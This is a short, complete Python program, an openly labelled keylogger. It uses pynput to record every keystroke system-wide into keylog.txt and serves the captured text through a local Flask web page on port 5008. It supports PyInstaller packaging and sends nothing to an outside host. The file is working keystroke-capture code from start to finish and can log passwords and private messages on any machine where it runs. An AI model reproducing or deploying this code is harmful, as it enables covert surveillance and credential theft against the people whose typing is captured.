import os
import sys
import webbrowser
from threading import Thread, Timer
from flask import Flask, render_template, jsonify
from pynput import keyboard

VERSION = "1.0.0"
LOG_FILE = "keylog.txt"

# Ensure log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("[KEYLOGGER ACTIVATED]\n")

if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
    template_folder = os.path.join(base_path, 'templates')
    static_folder = os.path.join(base_path, 'static')
    app = Flask(__name__, template_folder=template_folder, static_folder=static_folder)
else:
    app = Flask(__name__)

# --- KEYLOGGER LOGIC ---
listener = None

def on_press(key):
    try:
        # Log the alphanumeric key
        k = str(key.char)
    except AttributeError:
        # Log special keys (Space, Enter, etc.)
        k = f" [{str(key)}] "
    
    with open(LOG_FILE, "a") as f:
        f.write(k)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# --- ROUTES ---
@app.route('/')
def index():
    return render_template('index.html', version=VERSION)

@app.route('/get_logs')
def get_logs():
    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()
            # We only send the last 1000 characters for the UI
            return jsonify({"logs": content[-1000:]})
    except:
        return jsonify({"logs": "Error reading logs."})

@app.route('/clear_logs')
def clear_logs():
    with open(LOG_FILE, "w") as f:
        f.write("[LOGS CLEARED]\n")
    return jsonify({"status": "cleared"})

def open_browser():
    webbrowser.open_new('http://127.0.0.1:5008/')

if __name__ == '__main__':
    # Start the keylogger in a separate background thread
    Thread(target=start_keylogger, daemon=True).start()
    
    Timer(1, open_browser).start()
    app.run(host='127.0.0.1', port=5008, debug=False)
